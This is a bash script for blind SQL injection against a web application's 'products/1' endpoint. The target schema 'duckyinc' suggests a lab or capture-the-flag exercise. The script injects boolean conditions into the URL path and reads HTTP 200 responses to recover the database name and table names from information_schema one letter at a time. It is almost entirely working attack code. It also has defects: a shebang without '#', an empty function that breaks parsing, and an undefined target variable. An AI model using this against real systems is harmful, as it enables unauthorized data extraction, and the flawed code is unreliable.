!/bin/bash

#########################
#	Blind SQLi	#
#########################
#

function columns() {
	#SELECT substr(COLUMN_NAME) FROM information_schema.columns WHERE TABLE_NAME = <table> AND table_schema != <database>

}

function tables() {
	offset=2
	#SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != mysql AND table_schema != information_schema
	result=''
	path="products/1"
	length=$(get_length 'table_name' 'FROM information_schema.tables WHERE table_schema = \"duckyinc\" LIMIT 1 OFFSET '"$offset")
	echo $length

	 for index in $(seq 1 $length);
        do
                for letter in {a..z}
                do
                        sqli="and (SELECT substr(LOWER(table_name), $index,1) FROM information_schema.tables WHERE table_schema = 'duckyinc' LIMIT 1 OFFSET $offset) = '$letter'"
                        to_encode="${path} ${sqli}"

                        encoded_path=$(encode_url "$to_encode")

                        curl --silent -i "http://$target/${encoded_path}" | head -n 1 | grep -q '200'
                        if [ $? -eq 0 ]; then
                                result="${result}${letter}"
                                break

                        fi
                done
        done
	echo "$result"
}

function blind(){
	path="products/1"
	result=''

	length=$(get_length 'DATABASE()')

	[ $length -eq 0 ] && echo 'ERROR the searched length is equal to zero!' && exit 1

	for index in $(seq 1 $length);
	do
		for letter in {a..z}
		do
			sqli="and (SELECT substr(LOWER(DATABASE()), $index,1)) = '$letter'"
			to_encode="${path} ${sqli}"

			encoded_path=$(encode_url "$to_encode")

			curl --silent -i "http://$target/${encoded_path}" | head -n 1 | grep -q '200'
			if [ $? -eq 0 ]; then
				result="${result}${letter}"
				break

			fi
		done
	done
	echo $result
}


function get_length() {
	for index in {1..50}
	do
		path="products/1"
		sqli="and (SELECT LENGTH($1) $2) = '$index'"

		to_encode="${path} ${sqli}"
                encoded_path=$(python -c "from urllib.parse import quote; print(quote(\"${to_encode}\"));")

		curl --silent -i "http://$target/${encoded_path}" | head -n 1 | grep -q '200'

		if [ $? -eq 0 ]; then
                        echo $index
			length=$index
			break
		fi
	done
}

function encode_url() {
	echo $(python -c "from urllib.parse import quote; print(quote(\"${1}\"));")
}



length=0
#blind
tables ""
